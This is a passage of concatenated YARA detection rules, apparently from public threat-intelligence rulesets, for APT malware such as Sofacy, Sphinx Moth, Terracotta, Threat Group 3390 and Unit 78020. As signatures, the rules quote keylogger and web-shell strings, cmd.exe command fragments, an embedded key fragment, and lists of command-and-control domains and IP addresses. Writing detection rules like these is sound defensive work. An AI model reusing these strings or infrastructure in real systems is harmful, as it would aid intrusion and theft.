        date = "2015-06-19"
        hash = "5130f600cd9a9cdc82d4bad938b20cbd2f699aadb76e7f3f1a93602330d9997d"
        score = 70
    strings:
        $s1 = "\\\\.\\pipe\\ahexec" fullword ascii 
        $s2 = "implevel" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 115KB and all of them
}

rule Sofacy_Bundestag_Mal2 {
    meta:
        description = "Sofacy Group Malware Sample 2"
        author = "Florian Roth"
        reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
        date = "2015-06-19"
        hash = "566ab945f61be016bfd9e83cc1b64f783b9b8deb891e6d504d3442bc8281b092"
        score = 70
    strings:
        $x1 = "PROJECT\\XAPS_OBJECTIVE_DLL\\" ascii
        $x2 = "XAPS_OBJECTIVE.dll" fullword ascii

        $s1 = "i`m wait" fullword ascii 
    condition:
        uint16(0) == 0x5a4d and ( 1 of ($x*) ) and $s1
}

rule Sofacy_Bundestag_Mal3 {
    meta:
        description = "Sofacy Group Malware Sample 3"
        author = "Florian Roth"
        reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
        date = "2015-06-19"
        hash = "5f6b2a0d1d966fc4f1ed292b46240767f4acb06c13512b0061b434ae2a692fa1"
        score = 70
    strings:
        $s1 = "shell\\open\\command=\"System Volume Information\\USBGuard.exe\" install" fullword ascii 
        $s2 = ".?AVAgentModuleRemoteKeyLogger@@" fullword ascii 
        $s3 = "<font size=4 color=red>process isn't exist</font>" fullword ascii 
        $s4 = "<font size=4 color=red>process is exist</font>" fullword ascii 
        $s5 = ".winnt.check-fix.com" fullword ascii 
        $s6 = ".update.adobeincorp.com" fullword ascii 
        $s7 = ".microsoft.checkwinframe.com" fullword ascii
        $s8 = "adobeincorp.com" fullword wide 
        $s9 = "# EXC: HttpSender - Cannot create Get Channel!" fullword ascii 

        $x1 = "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/" wide 
        $x2 = "User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2" wide 
        $x3 = "C:\\Windows\\System32\\cmd.exe" fullword wide 
    condition:
        uint16(0) == 0x5a4d and filesize < 300KB and (
            2 of ($s*) or 
            ( 1 of ($s*) and all of ($x*) )
        ) 
}

rule Sofacy_Bundestag_Batch {
    meta:
        description = "Sofacy Bundestags APT Batch Script"
        author = "Florian Roth"
        reference = "http://dokumente.linksfraktion.de/inhalt/report-orig.pdf"
        date = "2015-06-19"
        score = 70
    strings:
        $s1 = "for %%G in (.pdf, .xls, .xlsx, .doc, .docx) do (" ascii 
        $s2 = "cmd /c copy"
        $s3 = "forfiles"
    condition:
        filesize < 10KB and all of them
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
    Yara Rule Set
    Author: Kudelski Security (modified by Florian Roth)
    Reference: https://www.kudelskisecurity.com/sites/default/files/sphinx_moth_cfc_report.pdf
    Date: 2015-11-23
    Identifier: Sphinx Moth
*/

rule Sphinx_Moth_cudacrt { 
    meta:
        description = "sphinx moth threat group file cudacrt.dll" 
        author = "Kudelski Security - Nagravision SA"
        reference = "www.kudelskisecurity.com"
        date = "2015-08-06"
    strings:
        $s0 = "HPSSOEx.dll" fullword wide
        $s1 = "255.255.255.254" fullword wide
        $s2 = "SOFTWARE\\SsoAuth\\Service" fullword wide

        $op0 = { ff 15 5f de 00 00 48 8b f8 48 85 c0 75 0d 48 8b } /* Opcode */ 
        $op1 = { 45 33 c9 4c 8d 05 a7 07 00 00 33 d2 33 c9 ff 15 } /* Opcode */ 
        $op2 = { e8 7a 1c 00 00 83 f8 01 74 17 b9 03 } /* Opcode */
    condition:
        uint16(0) == 0x5a4d and filesize < 243KB and all of ($s*) and 1 of ($op*)
}

rule Sphinx_Moth_h2t { 
    meta:
        description = "sphinx moth threat group file h2t.dat" 
        author = "Kudelski Security - Nagravision SA (modified by Florian Roth)" 
        reference = "www.kudelskisecurity.com"
        date = "2015-08-06"
    strings:
        $x1 = "%s <proxy ip> <proxy port> <target ip> <target port> <cmd> [arg1 cmd] ... [argX cmd]" fullword ascii 
        
        $s1 = "[-] Error in connection() %d - %s" fullword ascii
        $s2 = "[-] Child process exit." fullword ascii
        $s3 = "POST http://%s:%s/ HTTP/1.1" fullword ascii
        $s4 = "pipe() to" fullword ascii
        $s5 = "pipe() from" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 156KB and ($x1 or all of ($s*))
}

rule Sphinx_Moth_iastor32 { 
    meta:
        description = "sphinx moth threat group file iastor32.exe" 
        author = "Kudelski Security - Nagravision SA"
        reference = "www.kudelskisecurity.com"
        date = "2015-08-06"
    strings:
        $s0 = "MIIEpQIBAAKCAQEA4lSvv/W1Mkz38Q3z+EzJBZRANzKrlxeE6/UXWL67YtokF2nN" fullword ascii /* private key */
        $s1 = "iAeS3CCA4wli6+9CIgX8SAiXd5OezHvI1jza61z/flsqcC1IP//gJVt16nRx3s9z" fullword ascii /* private key */
    condition:
        uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule Sphinx_Moth_kerberos32 {
    meta:
        description = "sphinx moth threat group file kerberos32.dll" 
        author = "Kudelski Security - Nagravision SA (modified by Florian Roth)"
        reference = "www.kudelskisecurity.com"
        date = "2015-08-06"
    strings:
        $x1 = "%WINDIR%\\ativpsrz.bin" fullword ascii
        $x2 = "%WINDIR%\\ativpsrn.bin" fullword ascii
        $x3 = "kerberos32.dll" fullword wide
        $x4 = "KERBEROS64.dll" fullword ascii
        $x5 = "kerberos%d.dll" fullword ascii

        $s1 = "\\\\.\\pipe\\lsassp" fullword ascii
        $s2 = "LSASS secure pipe" fullword ascii /* PEStudio Blacklist: strings */ 
        $s3 = "NullSessionPipes" fullword ascii /* PEStudio Blacklist: strings */ 
        $s4 = "getlog" fullword ascii
        $s5 = "startlog" fullword ascii /* PEStudio Blacklist: strings */
        $s6 = "stoplog" fullword ascii /* PEStudio Blacklist: strings */
        $s7 = "Unsupported OS (%d)" fullword ascii /* PEStudio Blacklist: strings */ 
        $s8 = "Unsupported OS (%s)" fullword ascii /* PEStudio Blacklist: strings */
    condition:
        uint16(0) == 0x5a4d and filesize < 300KB and (2 of ($x*) or all of ($s*))
}

rule Sphinx_Moth_kerberos64 { 
    meta:
        description = "sphinx moth threat group file kerberos64.dll" 
        author = "Kudelski Security - Nagravision SA (modified by Florian Roth)"
        reference = "www.kudelskisecurity.com"
        date = "2015-08-06"
    strings:
        $s0 = "KERBEROS64.dll" fullword ascii
        $s1 = "zeSecurityDescriptor" fullword ascii
        $s2 = "SpGetInfo" fullword ascii
        $s3 = "SpShutdown" fullword ascii
        $op0 = { 75 05 e8 6a c7 ff ff 48 8b 1d 47 d6 00 00 33 ff } /* Opcode */ 
        $op1 = { 48 89 05 0c 2b 01 00 c7 05 e2 29 01 00 09 04 00 } /* Opcode */ 
        $op2 = { 48 8d 3d e3 ee 00 00 ba 58 } /* Opcode */
    condition:
        uint16(0) == 0x5a4d and filesize < 406KB and all of ($s*) and 1 of ($op*)
}

rule Sphinx_Moth_nvcplex { 
    meta:
        description = "sphinx moth threat group file nvcplex.dat" 
        author = "Kudelski Security - Nagravision SA"
        reference = "www.kudelskisecurity.com"
        date = "2015-08-06"
    strings:
        $s0 = "mshtaex.exe" fullword wide
        $op0 = { 41 8b cc 44 89 6c 24 28 48 89 7c 24 20 ff 15 d3 } /* Opcode */ 
        $op1 = { 48 3b 0d ad 8f 00 00 74 05 e8 ba f5 ff ff 48 8b } /* Opcode */ 
        $op2 = { 8b ce e8 49 47 00 00 90 8b 43 04 89 05 93 f1 00 } /* Opcode */
    condition:
        uint16(0) == 0x5a4d and filesize < 214KB and all of them
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule liudoor
{
meta:
        author = "RSA FirstWatch"
        date = "2015-07-23"
        description = "Detects Liudoor daemon backdoor"
        hash0 = "78b56bc3edbee3a425c96738760ee406"
        hash1 = "5aa0510f6f1b0e48f0303b9a4bfc641e"
        hash2 = "531d30c8ee27d62e6fbe855299d0e7de"
        hash3 = "2be2ac65fd97ccc97027184f0310f2f3"
        hash4 = "6093505c7f7ec25b1934d3657649ef07"
        type = "Win32 DLL"

strings:
        $string0 = "Succ"
        $string1 = "Fail"
        $string2 = "pass"
        $string3 = "exit"
        $string4 = "svchostdllserver.dll"
        $string5 = "L$,PQR"
        $string6 = "0/0B0H0Q0W0k0"
        $string7 = "QSUVWh"
        $string8 = "Ht Hu["
condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/


/* Rule Set ----------------------------------------------------------------- */
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-04
	Identifier: Terracotta APT
	Comment: Reduced Rule Set
*/
rule Apolmy_Privesc_Trojan {
	meta:
		description = "Apolmy Privilege Escalation Trojan used in APT Terracotta"
		author = "Florian Roth"
		reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
		date = "2015-08-04"
		score = 80
		hash = "d7bd289e6cee228eb46a1be1fcdc3a2bd5251bc1eafb59f8111756777d8f373d"
	strings:
		$s1 = "[%d] Failed, %08X" fullword ascii
		$s2 = "[%d] Offset can not fetched." fullword ascii
		$s3 = "PowerShadow2011" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule Mithozhan_Trojan {
	meta:
		description = "Mitozhan Trojan used in APT Terracotta"
		author = "Florian Roth"
		reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
		date = "2015-08-04"
		score = 70
		hash = "8553b945e2d4b9f45c438797d6b5e73cfe2899af1f9fd87593af4fd7fb51794a"
	strings:
		$s1 = "adbrowser" fullword wide 
		$s2 = "IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==" fullword ascii
		$s3 = "EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule RemoteExec_Tool {
	meta:
		description = "Remote Access Tool used in APT Terracotta"
		author = "Florian Roth"
		reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
		date = "2015-08-04"
		hash = "a550131e106ff3c703666f15d55d9bc8c816d1cb9ac1b73c2e29f8aa01e53b78"
	strings:
		$s0 = "cmd.exe /q /c \"%s\"" fullword ascii 
		$s1 = "\\\\.\\pipe\\%s%s%d" fullword ascii 
		$s2 = "This is a service executable! Couldn't start directly." fullword ascii 
		$s3 = "\\\\.\\pipe\\TermHlp_communicaton" fullword ascii 
		$s4 = "TermHlp_stdout" fullword ascii 
		$s5 = "TermHlp_stdin" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 75KB and 4 of ($s*)
}

/* Super Rules ------------------------------------------------------------- */

rule LiuDoor_Malware_1 {
	meta:
		description = "Liudoor Trojan used in Terracotta APT"
		author = "Florian Roth"
		reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
		date = "2015-08-04"
		score = 70
		super_rule = 1
		hash1 = "deed6e2a31349253143d4069613905e1dfc3ad4589f6987388de13e33ac187fc"
		hash2 = "4575e7fc8f156d1d499aab5064a4832953cd43795574b4c7b9165cdc92993ce5"
		hash3 = "ad1a507709c75fe93708ce9ca1227c5fefa812997ed9104ff9adfec62a3ec2bb"
	strings:
		$s1 = "svchostdllserver.dll" fullword ascii 
		$s2 = "SvcHostDLL: RegisterServiceCtrlHandler %S failed" fullword ascii 
		$s3 = "\\nbtstat.exe" fullword ascii
		$s4 = "DataVersionEx" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 150KB and all of them
}

rule LiuDoor_Malware_2 {
	meta:
		description = "Liudoor Trojan used in Terracotta APT"
		author = "Florian Roth"
		reference = "https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/"
		date = "2015-08-04"
		score = 70
		super_rule = 1
		hash1 = "f3fb68b21490ded2ae7327271d3412fbbf9d705c8003a195a705c47c98b43800"
		hash2 = "e42b8385e1aecd89a94a740a2c7cd5ef157b091fabd52cd6f86e47534ca2863e"
	strings:
		$s0 = "svchostdllserver.dll" fullword ascii 
		$s1 = "Lpykh~mzCCRv|mplpykCCHvq{phlCC\\jmmzqkIzmlvpqCC" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-08-06
	Identifier: Threat Group 3390
*/

rule HttpBrowser_RAT_dropper_Gen1 {
	meta:
		description = "Threat Group 3390 APT Sample - HttpBrowser RAT Dropper"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 70
		hash1 = "808de72f1eae29e3c1b2c32be1b84c5064865a235866edf5e790d2a7ba709907"
		hash2 = "f6f966d605c5e79de462a65df437ddfca0ad4eb5faba94fc875aba51a4b894a7"
		hash3 = "f424965a35477d822bbadb821125995616dc980d3d4f94a68c87d0cd9b291df9"
		hash4 = "01441546fbd20487cb2525a0e34e635eff2abe5c3afc131c7182113220f02753"
		hash5 = "8cd8159f6e4689f572e2087394452e80e62297af02ca55fe221fe5d7570ad47b"
		hash6 = "10de38419c9a02b80ab7bf2f1f1f15f57dbb0fbc9df14b9171dc93879c5a0c53"
		hash7 = "c2fa67e970d00279cec341f71577953d49e10fe497dae4f298c2e9abdd3a48cc"
	strings:
		$x1 = "1001=cmd.exe" fullword ascii 
		$x2 = "1003=ShellExecuteA" fullword ascii 
		$x3 = "1002=/c del /q %s" fullword ascii
		$x4 = "1004=SetThreadPriority" fullword ascii

		/* $s1 = "pnipcn.dllUT" fullword ascii
		$s2 = "ssonsvr.exeUT" fullword ascii
		$s3 = "navlu.dllUT" fullword ascii
		$s4 = "@CONOUT$" fullword wide 
		$s5 = "VPDN_LU.exeUT" fullword ascii
		$s6 = "msi.dll.urlUT" fullword ascii
		$s7 = "setup.exeUT" fullword ascii 
		$s8 = "pnipcn.dll.urlUT" fullword ascii
		$s9 = "ldvpreg.exeUT" fullword ascii */

		$op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b } /* Opcode */
		$op1 = { e8 85 34 00 00 59 59 8b 86 b4 } /* Opcode */
		$op2 = { 8b 45 0c 83 38 00 0f 84 97 } /* Opcode */
		$op3 = { 8b 45 0c 83 38 00 0f 84 98 } /* Opcode */
		$op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d } /* Opcode */
		$op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and all of ($x*) and 1 of ($op*)
}

rule HttpBrowser_RAT_Sample1 {
	meta:
		description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 80
		hash1 = "be334d1f8fa65a723af65200a166c2bbdb06690c8b30fafe772600e4662fc68b"
		hash2 = "1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb"
	strings:
		$s0 = "update.hancominc.com" fullword wide 
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and $s0
}

rule HttpBrowser_RAT_Sample2 {
	meta:
		description = "Threat Group 3390 APT Sample - HttpBrowser RAT Sample"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 80
		hash1 = "c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992"
	strings:
		$s0 = "nKERNEL32.DLL" fullword wide
		$s1 = "WUSER32.DLL" fullword wide
		$s2 = "mscoree.dll" fullword wide
		$s3 = "VPDN_LU.exeUT" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule HttpBrowser_RAT_Gen {
	meta:
		description = "Threat Group 3390 APT Sample - HttpBrowser RAT Generic"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 90
		hash1 = "0299493ccb175d452866f5e21d023d3e92cd8d28452517d1d19c0f05f2c5ca27"
		hash2 = "065d055a90da59b4bdc88b97e537d6489602cb5dc894c5c16aff94d05c09abc7"
		hash3 = "05c7291db880f94c675eea336ecd66338bd0b1d49ad239cc17f9df08106e6684"
		hash4 = "07133f291fe022cd14346cd1f0a649aa2704ec9ccadfab809ca9c48b91a7d81b"
		hash5 = "0f8893e87ddec3d98e39a57f7cd530c28e36d596ea0a1d9d1e993dc2cae0a64d"
		hash6 = "108e6633744da6efe773eb78bd0ac804920add81c3dde4b26e953056ac1b26c5"
		hash7 = "1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb"
		hash8 = "1277ede988438d4168bb5b135135dd3b9ae7d9badcdf1421132ca4692dd18386"
		hash9 = "19be90c152f7a174835fd05a0b6f722e29c648969579ed7587ae036679e66a7b"
		hash10 = "1e7133bf5a9fe5e462321aafc2b7770b8e4183a66c7fef14364a0c3f698a29af"
		hash11 = "2264e5e8fcbdcb29027798b200939ecd8d1d3ad1ef0aef2b8ce7687103a3c113"
		hash12 = "2a1bdeb0a021fb0bdbb328bd4b65167d1f954c871fc33359cb5ea472bad6e13e"
		hash13 = "259a2e0508832d0cf3f4f5d9e9e1adde17102d2804541a9587a9a4b6f6f86669"
		hash14 = "240d9ce148091e72d8f501dbfbc7963997d5c2e881b4da59a62975ddcbb77ca2"
		hash15 = "211a1b195cf2cc70a2caf8f1aafb8426eb0e4bae955e85266490b12b5322aa16"
		hash16 = "2d25c6868c16085c77c58829d538b8f3dbec67485f79a059f24e0dce1e804438"
		hash17 = "2d932d764dd9b91166361d8c023d64a4480b5b587a6087b0ce3d2ac92ead8a7d"
		hash18 = "3556722d9aa37beadfa6ba248a66576f767e04b09b239d3fb0479fa93e0ba3fd"
		hash19 = "365e1d4180e93d7b87ba28ce4369312cbae191151ac23ff4a35f45440cb9be48"
		hash20 = "36c49f18ce3c205152eef82887eb3070e9b111d35a42b534b2fb2ee535b543c0"
		hash21 = "3eeb1fd1f0d8ab33f34183893c7346ddbbf3c19b94ba3602d377fa2e84aaad81"
		hash22 = "3fa8d13b337671323e7fe8b882763ec29b6786c528fa37da773d95a057a69d9a"
	strings:
		$s0 = "%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d" fullword wide 
		$s1 = "HttpBrowser/1.0" fullword wide
		$s2 = "set cmd : %s" ascii fullword
		$s3 = "\\config.ini" wide fullword
	condition:
		uint16(0) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them
}

rule PlugX_NvSmartMax_Gen {
	meta:
		description = "Threat Group 3390 APT Sample - PlugX NvSmartMax Generic"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 70
		hash1 = "718fc72942b9b706488575c0296017971170463f6f40fa19b08fc84b79bf0cef"
		hash2 = "1c0379481d17fc80b3330f148f1b87ff613cfd2a6601d97920a0bcd808c718d0"
		hash3 = "555952aa5bcca4fa5ad5a7269fece99b1a04816d104ecd8aefabaa1435f65fa5"
		hash4 = "71f7a9da99b5e3c9520bc2cc73e520598d469be6539b3c243fb435fe02e44338"
		hash5 = "65bbf0bd8c6e1ccdb60cf646d7084e1452cb111d97d21d6e8117b1944f3dc71e"
	strings:
		$s0 = "NvSmartMax.dll" fullword ascii
		$s1 = "NvSmartMax.dll.url" fullword ascii
		$s2 = "Nv.exe" fullword ascii
		$s4 = "CryptProtectMemory failed" fullword ascii 
		$s5 = "CryptUnprotectMemory failed" fullword ascii 
		$s7 = "r%.*s(%d)%s" fullword wide
		$s8 = " %s CRC " fullword wide

		$op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 } /* Opcode */
		$op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 } /* Opcode */
		$op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of ($s*) and 1 of ($op*)
}

rule HttpBrowser_RAT_dropper_Gen2 {
	meta:
		description = "Threat Group 3390 APT Sample - HttpBrowser RAT Dropper"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 70
		hash1 = "c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992"
		hash2 = "dfa984174268a9f364d856fd47cfaca75804640f849624d69d81fcaca2b57166"
	strings:
		$s1 = "navlu.dll.urlUT" fullword ascii
		$s2 = "VPDN_LU.exeUT" fullword ascii
		$s3 = "pnipcn.dllUT" fullword ascii
		$s4 = "\\ssonsvr.exe" fullword ascii
		$s5 = "/c del /q %s" fullword ascii
		$s6 = "\\setup.exe" fullword ascii 
		$s7 = "msi.dllUT" fullword ascii

		$op0 = { 8b 45 0c 83 38 00 0f 84 98 } /* Opcode */
		$op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 } /* Opcode */
		$op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d } /* Opcode */
		$op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 } /* Opcode */
		$op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 } /* Opcode */
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 3 of ($s*) and 1 of ($op*)
}

rule ThreatGroup3390_Strings {
	meta:
		description = "Threat Group 3390 APT - Strings"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 60
	strings:
		$s1 = "\"cmd\" /c cd /d \"c:\\Windows\\Temp\\\"&copy" ascii
		$s2 = "svchost.exe a -k -r -s -m5 -v1024000 -padmin-windows2014"
		$s3 = "ren *.malware_rar *.zip" fullword ascii
		$s4 = "c:\\temp\\ipcan.exe" fullword ascii
		$s5 = "<%eval(Request.Item(\"admin-na-google123!@#" ascii
	condition:
		1 of them and filesize < 30KB
}

rule ThreatGroup3390_C2 {
	meta:
		description = "Threat Group 3390 APT - C2 Server"
		author = "Florian Roth"
		reference = "http://snip.ly/giNB"
		date = "2015-08-06"
		score = 60
	strings:
		$s1 = "api.apigmail.com"
		$s2 = "apigmail.com"
		$s3 = "backup.darkhero.org"
		$s4 = "bel.updatawindows.com"
		$s5 = "binary.update-onlines.org"
		$s6 = "blackcmd.com"
		$s7 = "castle.blackcmd.com"
		$s8 = "ctcb.blackcmd.com"
		$s9 = "darkhero.org"
		$s10 = "dav.local-test.com"
		$s11 = "test.local-test.com"
		$s12 = "dev.local-test.com"
		$s13 = "ocean.local-test.com"
		$s14 = "ga.blackcmd.com"
		$s15 = "helpdesk.blackcmd.com"
		$s16 = "helpdesk.csc-na.com"
		$s17 = "helpdesk.hotmail-onlines.com"
		$s18 = "helpdesk.lnip.org"
		$s19 = "hotmail-onlines.com"
		$s20 = "jobs.hotmail-onlines.com"
		$s21 = "justufogame.com"
		$s22 = "lnip.org"
		$s23 = "local-test.com"
		$s24 = "login.hansoftupdate.com"
		$s25 = "long.update-onlines.org"
		$s26 = "longlong.update-onlines.org"
		$s27 = "longshadow.dyndns.org"
		$s28 = "longshadow.update-onlines.org"
		$s29 = "longykcai.update-onlines.org"
		$s30 = "lostself.update-onlines.org"
		$s31 = "mac.navydocument.com"
		$s32 = "mail.csc-na.com"
		$s33 = "mantech.updatawindows.com"
		$s34 = "micr0soft.org"
		$s35 = "microsoft-outlook.org"
		$s36 = "mtc.navydocument.com"
		$s37 = "navydocument.com"
		$s38 = "mtc.update-onlines.org"
		$s39 = "news.hotmail-onlines.com"
		$s40 = "oac.3322.org"
		$s41 = "ocean.apigmail.com"
		$s42 = "pchomeserver.com"
		$s43 = "registre.organiccrap.com"
		$s44 = "security.pomsys.org"
		$s45 = "services.darkhero.org"
		$s46 = "sgl.updatawindows.com"
		$s47 = "shadow.update-onlines.org"
		$s48 = "sonoco.blackcmd.com"
		$s49 = "test.logmastre.com"
		$s50 = "up.gtalklite.com"
		$s51 = "updatawindows.com"
		$s52 = "update-onlines.org"
		$s53 = "update.deepsoftupdate.com"
		$s54 = "update.hancominc.com"
		$s55 = "update.micr0soft.org"
		$s56 = "update.pchomeserver.com"
		$s57 = "urs.blackcmd.com"
		$s58 = "wang.darkhero.org"
		$s59 = "webs.local-test.com"
		$s60 = "word.apigmail.com"
		$s61 = "wordpress.blackcmd.com"
		$s62 = "working.blackcmd.com"
		$s63 = "working.darkhero.org"
		$s64 = "working.hotmail-onlines.com"
		$s65 = "www.trendmicro-update.org"
		$s66 = "www.update-onlines.org"
		$s67 = "x.apigmail.com"
		$s68 = "ykcai.update-onlines.org"
		$s69 = "ykcailostself.dyndns-free.com"
		$s70 = "ykcainobody.dyndns.org"
		$s71 = "zj.blackcmd.com"
		$s72 = "laxness-lab.com"
		$s73 = "google-ana1ytics.com"
		$s74 = "www.google-ana1ytics.com"
		$s75 = "ftp.google-ana1ytics.com"
		$s76 = "hotmailcontact.net"
		$s77 = "208.115.242.36"
		$s78 = "208.115.242.37"
		$s79 = "208.115.242.38"
		$s80 = "66.63.178.142"
		$s81 = "72.11.148.220"
		$s82 = "72.11.141.133"
		$s83 = "74.63.195.236"
		$s84 = "74.63.195.236"
		$s85 = "74.63.195.237"
		$s86 = "74.63.195.238"
		$s87 = "103.24.0.142"
		$s88 = "103.24.1.54"
		$s89 = "106.187.45.162"
		$s90 = "192.151.236.138"
		$s91 = "192.161.61.19"
		$s92 = "192.161.61.20"
		$s93 = "192.161.61.22"
		$s94 = "103.24.1.54"
		$s95 = "67.215.232.179"
		$s96 = "96.44.177.195"
		$s97 = "49.143.192.221"
		$s98 = "67.215.232.181"
		$s99 = "67.215.232.182"
		$s100 = "96.44.182.243"
		$s101 = "96.44.182.245"
		$s102 = "96.44.182.246"
		$s103 = "49.143.205.30"
		$s104 = "working_success@163.com"
		$s105 = "ykcaihyl@163.com"
		$s106 = "working_success@163.com"
		$s107 = "yuming@yinsibaohu.aliyun.com"
	condition:
		uint16(0) == 0x5a4d and 1 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-09-24
	Identifier: Unit 78020 Malware
*/

rule Unit78020_Malware_Gen1 {
	meta:
		description = "Detects malware by Chinese APT PLA Unit 78020 - Generic Rule"
		author = "Florian Roth"
		reference = "http://threatconnect.com/camerashy/?utm_campaign=CameraShy"
		date = "2015-09-24"
		hash1 = "2b15e614fb54bca7031f64ab6caa1f77b4c07dac186826a6cd2e254090675d72"
		hash2 = "76c586e89c30a97e583c40ebe3f4ba75d5e02e52959184c4ce0a46b3aac54edd"
		hash3 = "2625a0d91d3cdbbc7c4a450c91e028e3609ff96c4f2a5a310ae20f73e1bc32ac"
		hash4 = "5c62b1d16e6180f22a0cb59c99a7743f44cb4a41e4e090b9733d1fb687c8efa2"
		hash5 = "7b73bf2d80a03eb477242967628da79924fbe06cc67c4dcdd2bdefccd6e0e1af"
		hash6 = "88c5be84afe20c91e4024160303bafb044f98aa5fbf8c9f9997758a014238790"
	strings:
		$x1 = "greensky27.vicp.net" fullword wide
		$x2 = "POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1" fullword ascii
		$x3 = "GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1" fullword ascii
		/* additional strings based on PDF report - not found in samples */
		$x4 = "serch.vicp.net" fullword wide
		$x5 = "greensky27.vicp.net" fullword wide
		$x6 = "greensky27.vicp.net.as" fullword wide
		$x7 = "greensky27.vcip.net" fullword wide
		$x8 = "pnoc-ec.vicp.net" fullword wide
		$x9 = "aseanph.vicp.net" fullword wide
		$x10 = "pnoc.vicp.net" fullword wide

		$a1 = "dMozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide /* typo */
		$a2 = "User-Agent: Netscape" fullword ascii /* ;) */
		$a3 = "Accept-Language:En-us/r/n" fullword wide /* typo */
		$a4 = "\\Office Start.lnk" fullword wide
		$a5 = "\\MSN Talk Start.lnk" fullword wide

		$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
		$s2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7" fullword ascii
		$s3 = "%USERPROFILE%\\Application Data\\Mozilla\\Firefox\\Profiles" fullword wide
		$s4 = "Content-Type:application/x-www-form-urlencoded/r/n" fullword wide
		$s5 = "Hello World!" fullword wide
		$s6 = "Accept-Encoding:gzip,deflate/r/n" fullword wide
		$s7 = "/%d%s%d" fullword ascii
		$s8 = "%02d-%02d-%02d %02d:%02d" fullword wide
		$s9 = "WininetMM Version 1.0" fullword wide
		$s10 = "WININETMM" fullword wide
		$s11 = "GET %dHTTP/1.1" fullword ascii
		$s12 = "POST http://%ws:%d/%d%s%dHTTP/1.1" fullword ascii
		$s13 = "PeekNamePipe" fullword ascii
		$s14 = "Normal.dot" fullword ascii
